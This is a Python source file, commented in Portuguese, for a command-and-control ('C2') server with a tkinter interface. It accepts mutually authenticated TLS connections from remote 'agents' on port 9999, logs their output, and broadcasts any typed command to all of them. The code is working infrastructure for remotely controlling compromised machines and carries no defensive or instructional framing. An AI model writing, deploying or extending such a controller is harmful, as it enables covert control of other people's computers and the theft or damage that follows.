import socket
import ssl
import threading
import tkinter as tk
from tkinter import scrolledtext

# Configurações SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.verify_mode = ssl.CERT_REQUIRED
context.load_cert_chain(certfile="server.crt", keyfile="server.key")
context.load_verify_locations(cafile="../ca/ca.crt")

# Lista para armazenar conexões de agentes
agents = []

# Função para lidar com cada agente
def handle_agent(conn, addr, gui):
    gui.log(f"Agente conectado: {addr}")
    try:
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            gui.log(f"{addr}: {data}")
    except:
        pass
    finally:
        conn.close()
        gui.log(f"Agente desconectado: {addr}")

# Classe da Interface Gráfica
class ServerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Servidor C2")

        self.log_area = scrolledtext.ScrolledText(master, width=80, height=20)
        self.log_area.pack()

        self.command_entry = tk.Entry(master, width=80)
        self.command_entry.pack()
        self.command_entry.bind("<Return>", self.send_command)

    def log(self, message):
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)

    def send_command(self, event):
        command = self.command_entry.get()
        self.command_entry.delete(0, tk.END)
        for agent in agents:
            try:
                agent.sendall(command.encode())
            except:
                pass
        self.log(f"Comando enviado: {command}")

# Função principal do servidor
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9999))
    server_socket.listen(5)
    gui.log("Servidor iniciado e aguardando conexões...")

    while True:
        client_socket, addr = server_socket.accept()
        conn = context.wrap_socket(client_socket, server_side=True)
        agents.append(conn)
        threading.Thread(target=handle_agent, args=(conn, addr, gui)).start()

# Inicialização da interface gráfica e do servidor
root = tk.Tk()
gui = ServerGUI(root)
threading.Thread(target=start_server, daemon=True).start()
root.mainloop()